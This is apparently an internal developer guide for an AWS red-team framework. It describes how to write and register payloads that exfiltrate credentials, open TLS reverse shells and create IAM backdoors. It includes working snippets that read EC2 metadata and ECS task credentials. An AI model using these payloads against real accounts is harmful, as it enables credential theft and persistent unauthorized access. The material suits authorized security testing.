# Payload Patterns and Reuse Guide

## Modular, Service-Scoped Registry

Payloads are decoupled from modules. Each payload lives under `pkg/payloads/{service}/` (`ec2/`, `lambda/`, `glue/` — add a new service directory only when introducing that service's first payload), self-registers in `init()` via `payloads.Register(&MyPayload{})`, and declares its context via tags: `TagService{...}`, `TagLanguage{...}`, `TagTechnique{...}`, `TagTransport{...}` (see `pkg/payloads/tags.go`).

The registry uses a composite `(service, name)` key, so `backdoor/attach-policy` can exist independently under `pkg/payloads/ec2/`, `pkg/payloads/lambda/`, and `pkg/payloads/glue/` — each generates language-appropriate code (bash vs Python) for the same logical action. Modules never hardcode a payload list; they declare `GetCompatibleTags()` and the registry surfaces every matching payload at runtime via `GetPayloadsByTags`. This is what makes the payload system **modular**: adding a new payload file (with its `init()`) automatically makes it available to every module whose tags match — no module or REPL changes needed.

## Attacker Infra & Listener-Dependent Payloads

`pkg/attacker/` runs a `UnifiedListener` that combines an HTTPS `/collect` endpoint (for credential exfil) and a TLS reverse-shell listener. The listener can run locally OR on the attacker EC2 box deployed via `attacker infra ec2 create` — payloads dial back to it either way, so from the payload's perspective it's just "reach the listener at `LISTENER_IP:LISTENER_PORT` / `HTTPS_URL`."

When `attacker listener start` runs and resolves a public IP, the REPL auto-injects these payload options into the current session (see `injectListenerOptions` in `pkg/core/repl/attacker_listener.go`), and they'll persist until explicitly unset:

| Option | Auto-injected value | Used by |
|---|---|---|
| `LISTENER_IP` | Listener's public IP | `revshell/tls` |
| `LISTENER_PORT` | Listener's ShellPort (default `4444`) | `revshell/tls` |
| `HTTPS_URL` | `https://<PublicIP>:<HTTPSPort>/collect` | `exfil/https` |

Separately, `attacker infra bucket create` provisions the exfil S3 bucket and stores its name in workspace state. When a module's payload declares an `EXFIL_BUCKET` option, `pkg/core/repl/module.go` auto-populates it from `attacker.GetExfilBucket()`; same path auto-defaults `TARGET_ARN` to the current identity's ARN.

**Conventions when authoring a new listener-dependent payload:**
- Reuse the standard option names above so the auto-inject wiring picks them up — don't invent new names like `CALLBACK_HOST` or `SHELL_IP`.
- Read them via `os.environ.get()` (Lambda/Glue Python) or `${LISTENER_IP}` shell expansion (EC2 bash) rather than string-substituting into the source at code-gen time.
- If your payload posts JSON to the `/collect` endpoint, follow the shape the listener's `creds_handler` expects (see `pkg/attacker/creds_handler.go`) so credentials auto-import as new identities.
- Reverse shells register with the listener's `ShellSessionManager` automatically on connect — they're then interactable via `sessions list/interact/kill`. No extra wiring in the payload.

## When to Reuse vs Create New Payloads

### Decision Tree

1. Does the module use payloads at all?
   - Self-escalation (iam-001 to iam-013): **NO** — direct IAM API calls
   - Two-step (iam-014 to iam-021): **NO** — IAM modification + STS assume
   - Principal-access (sts-001): **NO** — direct STS API call
   - New-passrole with code execution (lambda, ec2, ecs, glue, etc.): **YES**

2. Does `pkg/payloads/{service}/` already exist?
   - If YES: check existing payloads first
   - If NO: create the directory and the payload(s) needed for this specific module. For direct-invoke modules, `exfil/response` is usually a good starter; for event-triggered modules, `exfil/response` cannot capture output — start with an action-based payload (`backdoor/*`) or an out-of-band exfil (`exfil/https`, `exfil/s3`).

3. For the existing service, does an existing payload match the exploitation pattern?
   - Same code execution context → reuse directly
   - Similar but different parameters → consider adding options to existing payload
   - Fundamentally different mechanism → create new payload

### Checking Existing Payloads

```go
// In your module, query the registry:
existingPayloads := payloads.GetPayloadsByTags([]string{payloads.TagServiceLambda})
// This returns all registered payloads with the "lambda" tag
```

### Current Payload Inventory

Always run `grep -rE 'return "(exfil|backdoor|access|revshell)/[a-z-]+"' pkg/payloads/` before adding a new payload — the tables below are a snapshot and may lag actual state.

#### Lambda (Python) — `pkg/payloads/lambda/`
| Payload | Description | Optional Interfaces |
|---------|-------------|---------------------|
| `exfil/response` | Returns credentials via Lambda return value (direct-invoke only) | — |
| `exfil/https` | Sends credentials via HTTPS POST to attacker listener | — |
| `exfil/s3` | Writes credentials into an attacker-owned S3 bucket | — |
| `backdoor/attach-policy` | Attaches an admin policy to an existing IAM principal | Verifiable, SideEffectReporter |
| `backdoor/create-role` | Creates IAM role with admin trust policy | SideEffectReporter |
| `backdoor/create-user` | Creates IAM user with admin access | SideEffectReporter |
| `backdoor/create-access-key` | Creates new access key for an existing IAM user | SideEffectReporter |
| `backdoor/update-role-trust` | Rewrites a target role's trust policy to allow the attacker | SideEffectReporter |
| `revshell/tls` | Opens a TLS reverse shell to the attacker listener | — |

#### EC2 (Bash) — `pkg/payloads/ec2/`
| Payload | Description | Optional Interfaces |
|---------|-------------|---------------------|
| `exfil/https` | Sends instance-metadata creds via HTTPS POST | — |
| `exfil/s3` | Writes instance-metadata creds to an attacker-owned S3 bucket | — |
| `backdoor/attach-policy` | Attaches admin policy to a target principal | SideEffectReporter |
| `backdoor/create-role` | Creates IAM role with admin trust policy | SideEffectReporter |
| `backdoor/create-user` | Creates IAM user with admin access | SideEffectReporter |
| `backdoor/create-access-key` | Creates access key for an existing IAM user | SideEffectReporter |
| `backdoor/update-role-trust` | Rewrites a target role's trust policy | SideEffectReporter |
| `revshell/tls` | Opens a TLS reverse shell (file: `access_reverse_tls.go`, name still `revshell/tls`) | — |

Also under `pkg/payloads/ec2/`: `imds.go` is a shared helper for building IMDSv2 token fetch snippets — not a registered payload.

#### Glue (Python) — `pkg/payloads/glue/`
| Payload | Description | Optional Interfaces |
|---------|-------------|---------------------|
| `exfil/response` | Prints credentials to Glue job output (readable via `GetJobRun`) | — |
| `exfil/https` | Sends credentials via HTTPS POST | — |
| `exfil/s3` | Writes credentials into an attacker-owned S3 bucket | — |
| `exfil/cloudwatch` | Writes credentials into a CloudWatch log stream | — |
| `backdoor/attach-policy` | Attaches admin policy to target principal | SideEffectReporter |
| `backdoor/create-role` | Creates IAM role with admin trust policy | SideEffectReporter |
| `backdoor/create-user` | Creates IAM user with admin access | SideEffectReporter |
| `backdoor/create-access-key` | Creates access key for an existing IAM user | SideEffectReporter |
| `backdoor/update-role-trust` | Rewrites a target role's trust policy | SideEffectReporter |
| `revshell/tls` | Opens a TLS reverse shell | — |

## Payload Template: Lambda (Python)

```go
package lambda

import (
    "fmt"
    "pathrunner/pkg/modules"
    "pathrunner/pkg/payloads"
)

type NewPayload struct{}

func init() {
    payloads.Register(&NewPayload{})
}

func (p *NewPayload) GetName() string        { return "technique/method" }
func (p *NewPayload) GetDescription() string  { return "Description of what this payload does" }
func (p *NewPayload) GetTags() []string {
    return []string{
        payloads.TagServiceLambda,
        payloads.TagLanguagePython,
        payloads.TagTechniqueExfil,
        payloads.TagTransportResponse,
    }
}

func (p *NewPayload) GetOptions() []modules.Option {
    return []modules.Option{
        // Payload-specific options beyond what the module provides
    }
}

func (p *NewPayload) Validate(options map[string]string) error {
    // Validate payload-specific options
    return nil
}

func (p *NewPayload) GenerateCode(options map[string]string) (string, error) {
    code := `import json
import boto3

def lambda_handler(event, context):
    sts = boto3.client('sts')
    identity = sts.get_caller_identity()

    return {
        'statusCode': 200,
        'body': json.dumps({
            'account': identity['Account'],
            'arn': identity['Arn'],
            'user_id': identity['UserId']
        })
    }
`
    return code, nil
}

func (p *NewPayload) ProcessResult(result string) (string, error) {
    // Parse the Lambda response and format for display
    return fmt.Sprintf("Payload result:\n%s", result), nil
}
```

## Payload Template: EC2 (Bash)

```go
package ec2

import (
    "fmt"
    "pathrunner/pkg/modules"
    "pathrunner/pkg/payloads"
)

type NewPayload struct{}

func init() {
    payloads.Register(&NewPayload{})
}

func (p *NewPayload) GetName() string        { return "technique/method" }
func (p *NewPayload) GetDescription() string  { return "Description" }
func (p *NewPayload) GetTags() []string {
    return []string{
        payloads.TagServiceEC2,
        payloads.TagLanguageBash,
        payloads.TagTechniqueExfil,
        payloads.TagTransportHTTPS,
    }
}

func (p *NewPayload) GetOptions() []modules.Option {
    return []modules.Option{}
}

func (p *NewPayload) Validate(options map[string]string) error {
    return nil
}

func (p *NewPayload) GenerateCode(options map[string]string) (string, error) {
    script := `#!/bin/bash
# EC2 user-data script
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
CREDS=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
ROLE_CREDS=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$CREDS")
echo "$ROLE_CREDS"
`
    return script, nil
}

func (p *NewPayload) ProcessResult(result string) (string, error) {
    return fmt.Sprintf("EC2 payload result:\n%s", result), nil
}
```

## Payload Template: ECS (Container Command)

For ECS modules, payloads are typically container commands or overrides. The pattern is similar to EC2 bash but runs inside a container.

```go
package ecs

import (
    "fmt"
    "pathrunner/pkg/modules"
    "pathrunner/pkg/payloads"
)

type ExfilOutput struct{}

func init() {
    payloads.Register(&ExfilOutput{})
}

func (p *ExfilOutput) GetName() string        { return "exfil/response" }
func (p *ExfilOutput) GetDescription() string  { return "Exfiltrate task role credentials via container output" }
func (p *ExfilOutput) GetTags() []string {
    return []string{
        payloads.TagServiceECS,
        payloads.TagLanguageBash,
        payloads.TagTechniqueExfil,
        payloads.TagTransportResponse,
    }
}

func (p *ExfilOutput) GetOptions() []modules.Option {
    return []modules.Option{}
}

func (p *ExfilOutput) Validate(options map[string]string) error {
    return nil
}

func (p *ExfilOutput) GenerateCode(options map[string]string) (string, error) {
    // ECS tasks get credentials via the ECS credential endpoint
    command := `curl -s $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | python3 -c "import sys,json; d=json.load(sys.stdin); print(json.dumps({'AccessKeyId':d['AccessKeyId'],'SecretAccessKey':d['SecretAccessKey'],'Token':d['Token']}))"`
    return command, nil
}

func (p *ExfilOutput) ProcessResult(result string) (string, error) {
    return fmt.Sprintf("ECS task credentials:\n%s", result), nil
}
```

## Optional Payload Interfaces

Beyond the core `Payload` interface, payloads can implement two optional interfaces that enable advanced module behavior. These are defined in `pkg/payloads/interface.go`.

### `Verifiable` — For Event-Triggered Modules

When a payload runs inside an event-triggered function (ESM, CloudWatch Events, etc.), the module can't inspect the function's return value. The `Verifiable` interface lets the module verify the payload's effect by probing the environment.

```go
type Verifiable interface {
    VerifySuccess(ctx context.Context, config aws.Config, options map[string]string) (bool, error)
}
```

**When to implement**: If the payload modifies observable state (attaches a policy, creates a user, etc.) and the effect can be tested with an API call from the starting user's credentials.

**Example** (`backdoor/attach-policy`): Calls `iam:ListUsers` with the starting user's creds. If the policy was attached, the call succeeds; otherwise it returns AccessDenied.

```go
func (p *BackdoorAttachPolicyPayload) VerifySuccess(ctx context.Context, config aws.Config, options map[string]string) (bool, error) {
    iamClient := iam.NewFromConfig(config)
    _, err := iamClient.ListUsers(ctx, &iam.ListUsersInput{MaxItems: aws.Int32(1)})
    if err != nil {
        return false, nil  // Not yet — AccessDenied
    }
    return true, nil  // Policy attached and propagated
}
```

### `SideEffectReporter` — For Cleanup Tracking

When a payload modifies existing resources (attaches a policy to a user, modifies a role trust policy, etc.), those modifications need to be tracked for cleanup. The `SideEffectReporter` interface lets the payload declare what it changed.

```go
type SideEffectReporter interface {
    ReportSideEffects(options map[string]string) []modules.CreatedResource
}
```

**When to implement**: If the payload attaches policies, modifies roles, creates users, or makes any other change to existing resources that should be reverted during cleanup.

**Example** (`backdoor/attach-policy`): Reports the policy attachment as an `iam:attached-policy` resource.

```go
func (p *BackdoorAttachPolicyPayload) ReportSideEffects(options map[string]string) []modules.CreatedResource {
    targetUser := options["TARGET_USER"]
    policyArn := options["POLICY_ARN"]
    if policyArn == "" {
        policyArn = "arn:aws:iam::aws:policy/AdministratorAccess"
    }
    return []modules.CreatedResource{
        {
            Type:          "iam:attached-policy",
            Name:          fmt.Sprintf("%s←%s", targetUser, "AdministratorAccess"),
            ARN:           policyArn,
            CleanupMethod: "iam:DetachUserPolicy",
            Metadata: map[string]string{
                "principal_type": "user",
                "principal_name": targetUser,
                "policy_arn":     policyArn,
            },
        },
    }
}
```

**Important**: The module (not the payload) is responsible for setting `ModuleID` and `Region` on each side effect before tracking it. See the module template for the pattern.

### Lambda Environment Variables for Payload Parameters

For Lambda payloads, pass runtime parameters via Lambda environment variables rather than string-concatenating them into the Python source code. This is cleaner and avoids injection issues.

**In the payload's GenerateCode()**: Read from `os.environ`:
```python
target_user = os.environ.get('TARGET_USER', '')
policy_arn = os.environ.get('POLICY_ARN', 'arn:aws:iam::aws:policy/AdministratorAccess')
```

**In the module's Execute()**: Set env vars on the Lambda function:
```go
envVars := map[string]string{}
if targetUser := options["TARGET_USER"]; targetUser != "" {
    envVars["TARGET_USER"] = targetUser
}
createInput.Environment = &types.Environment{Variables: envVars}
```

## Service-Specific Notes

### Lambda Payloads
- Always Python (runtime: python3.11+)
- Code must define `lambda_handler(event, context)`
- Return value becomes the invocation result (direct-invoke only; event-triggered modules cannot capture it)
- Use `boto3` for AWS SDK calls inside Lambda
- Zip deployment via `utils.CreateLambdaZip(code)`
- Pass payload parameters via Lambda environment variables (not hardcoded in Python source)
- For event-triggered modules: implement `Verifiable` so the module can confirm the payload executed
- For payloads that modify resources: implement `SideEffectReporter` for cleanup tracking

### EC2 Payloads
- Always bash scripts
- Run as user-data (base64 encoded)
- IMDSv2 for metadata access (use token-based approach)
- Results cannot be directly returned — use webhook or check CloudWatch
- Instance profile credentials via metadata endpoint

### ECS Payloads
- Container commands (bash or language-specific)
- Credentials via `$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`
- Can override container command or use exec
- Results via CloudWatch Logs or container output

### Glue Payloads
- Python scripts for Glue jobs
- Credentials via the Glue job's IAM role
- Results via CloudWatch or S3

## Naming Convention

Payloads follow `{category}/{action}` naming. No service prefix — same logical action across services shares the same name. Service context is handled by tags + registry composite keys.

### Categories

| Category | Purpose | Examples |
|---|---|---|
| `backdoor/` | IAM modification — escalating existing principals or creating new ones | `attach-policy`, `create-user`, `create-role`, `create-access-key`, `update-role-trust` |
| `exfil/` | Extract credentials/data to the attacker (read-only against AWS) | `response`, `https`, `s3`, `cloudwatch` |
| `revshell/` | Interactive access — reverse shell to the attacker listener | `tls` |

Note on tag alignment: `revshell/*` payload names currently use `TagTechniqueAccess` in their tag list (the `revshell` prefix has no dedicated tag constant in `pkg/payloads/tags.go`). If you introduce a distinct revshell payload family, either reuse `TagTechniqueAccess` for consistency with the existing ones or add a new `TagTechniqueRevshell` constant — but don't invent a new tag inline.

### Current Names

- `exfil/response` — Return credentials via function/task return value (direct-invoke only)
- `exfil/https` — Send credentials to attacker endpoint via HTTPS POST
- `exfil/s3` — Write credentials to attacker-owned S3 bucket
- `exfil/cloudwatch` — Write credentials to CloudWatch log stream (Glue)
- `backdoor/attach-policy` — Attach a policy (default: AdministratorAccess) to an existing IAM principal
- `backdoor/create-role` — Create IAM role with admin trust policy
- `backdoor/create-user` — Create IAM user with admin access + keys
- `backdoor/create-access-key` — Create new access key for an existing IAM user
- `backdoor/update-role-trust` — Rewrite a target role's trust policy so the attacker can assume it
- `revshell/tls` — Open a TLS reverse shell to the attacker listener
